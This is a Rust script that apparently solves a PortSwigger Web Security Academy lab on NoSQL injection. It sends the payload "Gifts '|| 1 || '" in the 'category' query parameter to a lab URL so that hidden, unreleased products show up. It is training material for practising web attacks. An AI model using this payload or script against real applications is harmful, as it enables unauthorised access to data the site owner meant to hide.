/************************************************************************************
*
* Author: Ahmed Elqalaawy (@elqal3awii)
*
* Date: 29/9/2023
*
* Lab: Detecting NoSQL injection
*
* Steps: 1. Inject payload into "category" query parameter to retrieve
*           unreleased products
*        2. Observe unreleased products in the response
*
*************************************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0a6b00bb04eb041280d82bd200ce0096.web-security-academy.net";
    
    // build the client that will be used for all subsequent requests
    let client = build_client();

    println!(
        "{} {}",
        "❯ Injection parameter:".blue(),
        "category".yellow(),
    );

    // payload to retrieve unreleased products
    let payload = "Gifts '|| 1 || '";

    print!(
        "{}",
        "❯ Injecting payload to retrieve unreleased products.. ".white(),
    );
    io::stdout().flush();

    // fetch the page with the injected payload
    client
        .get(format!("{url}/filter?category={payload}"))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to fetch the page with the injected payload".red()
        ));
    println!("{}", "OK".green());

    println!(
        "{} {}",
        "🗹 Check your browser, it should be marked now as"
            .white()
            .bold(),
        "solved".green().bold()
    )
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}
